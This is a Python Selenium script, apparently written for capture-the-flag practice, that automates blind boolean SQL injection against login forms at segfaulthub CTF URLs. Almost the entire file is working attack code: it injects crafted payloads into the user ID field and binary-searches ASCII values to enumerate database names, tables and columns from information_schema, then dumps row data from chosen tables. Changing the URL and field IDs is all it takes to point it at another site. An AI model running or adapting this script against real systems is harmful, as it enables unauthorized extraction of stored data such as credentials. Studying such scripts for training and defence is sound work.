# -*- coding: utf-8 -*-

from selenium import webdriver
from selenium.common.exceptions import *
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait
from typing import List, Dict, Tuple
from webdriver_manager.chrome import ChromeDriverManager
import requests
from bs4 import BeautifulSoup as bs

attack_url: str = "http://ctf.segfaulthub.com:9999/login3/login.php"
# attack_url: str = "http://ctf2.segfaulthub.com:7777/sqli_3/login.php"
# attack_url: str = "http://ctf2.segfaulthub.com:7777/sqli_2_2/login.php"
# attack_url: str = "http://ctf2.segfaulthub.com:7777/sqli_2_1/login.php"
# attack_url: str = "http://ctf2.segfaulthub.com:7777/sqli_2/login.php"
# attack_url: str = "http://ctf.segfaulthub.com:1020/sqlInjection5_1.php"
user_id: str = "doldol"
user_pw: str = "dol1234"

l: int = 0
r: int = 0
num: int = 0

database_lst: List[str] = []
table_lst: List[List[str]] = []
column_lst: List[List[str]] = []
data_lst: List[List[str]] = []

def sql_result(sql: str) -> bool:
    global user_pw

    id_input_box = driver.find_element(By.ID, 'inputUserid')
    pw_input_box = driver.find_element(By.ID, 'inputPassword')
    # query_box = driver.find_element(By.CSS_SELECTOR, 'body > main > div > form > input[type=text]')

    id_input_box.send_keys(sql)
    pw_input_box.send_keys(user_pw)
    pw_input_box.send_keys(Keys.RETURN)
    # query_box.send_keys(sql)
    # query_box.send_keys(Keys.RETURN)

    html = driver.page_source

    soup = bs(html, "html.parser")
    text = soup.get_text()

    if "Logged In" in text:
        btn = driver.find_element(By.CSS_SELECTOR, "body > div > div.jumbotron > p:nth-child(3) > a")
        btn.click()
        return True
    else: return False
    
    # if "존재하는 아이디입니다" in text:
    #     return True
    # else: return False
    
def counting(query: str) -> int:
    l = 0
    r = 100

    while (l <= r):
        num = (l + r) // 2
        sql: str = f"{user_id}' and (({query}) < {str(num)}) #"

        if sql_result(sql):
            r = num - 1
        else:
            sql: str = f"{user_id}' and (({query}) = {str(num)}) #"
            if sql_result(sql):
                return num
            else: l = num + 1
    
    return -1

def char_length(query: str, cnt: int) -> int:
    l = 0
    r = 100

    while (l <= r):
        num = (l + r) // 2
        sql = f"{user_id}' and ((char_length(({query}))) < {str(num)}) #"

        if sql_result(sql):
            r = num - 1
        else:
            sql: str = f"{user_id}' and ((char_length(({query}))) = {str(num)}) #"
            if sql_result(sql):
                return num
            else: l = num + 1

def find_name(query: str, length: int) -> str:
    tmp = []
    for i in range(length):
        l = 0
        r = 128

        while (l <= r):
            num = (l + r) // 2
            sql = f"{user_id}' and (ascii(substr(({query}), {str(i + 1)}, 1)) < {str(num)}) #"

            if sql_result(sql):
                r = num - 1
            else:
                sql = f"{user_id}' and (ascii(substr(({query}), {str(i + 1)}, 1)) = {str(num)}) #"
                if sql_result(sql):
                    tmp.append(chr(num))
                    break
                else: l = num + 1
    return "".join(tmp)

def find_db():
    global database_lst

    print(f"database searching...")
    query: str = "select count(database())"
    cnt = counting(query)

    for i in range(cnt):
        query = "select database()"
        length = char_length(query, cnt)
        database_lst.append(find_name(query, length))

    return database_lst

def find_table():
    global database_lst, table_lst
    print(f"table searching...")

    for i in range(len(database_lst)):
        table_names: List[str] = []

        query: str = f"select count(table_name) from information_schema.tables where table_schema = '{database_lst[i]}'"
        cnt = counting(query)

        for j in range(cnt):
            print(f"{i + 1} database {j + 1} table searching...")

            query = f"select table_name from information_schema.tables where table_schema = '{database_lst[i]}' limit {str(j)}, 1"

            res = char_length(query, cnt)
            table_name = find_name(query, res)

            table_names.append(table_name)

        table_lst.append(table_names)
    return table_lst

def find_column():
    global database_lst, table_lst, column_lst

    for i in range(len(database_lst)):
        for j in range(len(table_lst[i])):
            column_names: List[str] = []

            query: str = f"select count(column_name) from information_schema.columns where table_name = '{table_lst[i][j]}'"
            cnt = counting(query)

            for k in range(cnt):
                print(f"{i + 1} database {j + 1} table {k + 1} column searching...")

                query = f"select column_name from information_schema.columns where table_name = '{table_lst[i][j]}' limit {str(k)}, 1"
                length = char_length(query, cnt)

                column_name = find_name(query, length)
                column_names.append(column_name)
            column_lst.append(column_names)
    return column_lst

def find_selected_column():
    global database_lst, table_lst, column_lst

    table_idx = int(input("what number of table you find?: "))
    for i in range(len(database_lst)):
        column_names: List[str] = []

        query: str = f"select count(column_name) from information_schema.columns where table_name = '{table_lst[i][table_idx]}'"
        cnt = counting(query)

        for k in range(cnt):
            print(f"{i + 1} database {table_idx + 1} table {k + 1} column searching...")

            query = f"select column_name from information_schema.columns where table_name = '{table_lst[i][table_idx]}' limit {str(k)}, 1"
            length = char_length(query, cnt)

            column_name = find_name(query, length)
            column_names.append(column_name)
        column_lst.append(column_names)
    return column_lst

def find_data():
    global database_lst, table_lst, column_lst, data_lst

    for i in range(len(database_lst)):
        for j in range(len(table_lst[i])):
            for k in range(len(column_lst[j])):
                datas: List[str] = []

                query: str = f"select count({column_lst[j][k]}) from {table_lst[i][j]}"
                cnt = counting(query)

                for l in range(cnt):
                    print(f"{i + 1} database {j + 1} table {k + 1} column {l + 1} data searching...")
                    query = f"select {column_lst[j][k]} from {table_lst[i][j]} limit {str(l)}, 1"
                    length = char_length(query, cnt)

                    data = find_name(query, length)
                    datas.append(data)
                data_lst.append(datas)
    return data_lst

def find_selected_data():
    global database_lst, table_lst, column_lst, data_lst

    table_idx = int(input("what number of table you find?: "))
    column_idx = int(input("what number of column you find?: "))

    for i in range(len(database_lst)):
        datas: List[str] = []

        query: str = f"select count({column_lst[table_idx][column_idx]}) from {table_lst[i][table_idx]}"
        cnt = counting(query)

        for l in range(cnt):
            print(f"{i + 1} database {table_idx + 1} table {column_idx + 1} column {l + 1} data searching...")
            query = f"select {column_lst[table_idx][column_idx]} from {table_lst[i][table_idx]} limit {str(l)}, 1"
            length = char_length(query, cnt)

            data = find_name(query, length)
            datas.append(data)
        data_lst.append(datas)
    return data_lst

def selected_data(table_name, column_name):
    global database_lst, table_lst, column_lst, data_lst

    # for i in range(len(database_lst)):
    datas: List[str] = []

    query: str = f"select count({column_name}) from {table_name}"
    cnt = counting(query)

    for l in range(cnt):
        query = f"select {column_name} from {table_name} limit {l}, 1"
        length = char_length(query, cnt)

        data = find_name(query, length)
        datas.append(data)
    data_lst.append(datas)

    return data_lst

try:
    # driver's options
    driver_options = Options()
    driver_options.add_experimental_option("excludeSwitches", ["enable-logging"])
    driver_options.add_argument("headless")
    wait_time: int = 3  # sec

    # initialize the lastest driver
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options = driver_options)
    driver.implicitly_wait(wait_time)

    # set intial page
    driver.get(url = attack_url)
    
    find_db()
    print(database_lst)
    
    find_table()
    print(table_lst)
    
    # find_column()
    find_selected_column()
    print(column_lst)

    # find_data()
    # find_selected_data()
    tmp1, tmp2 = map(str, input().split())
    selected_data(tmp1, tmp2)
    print(data_lst)
except Exception as e:
    print(type(e))
finally:
    driver.close()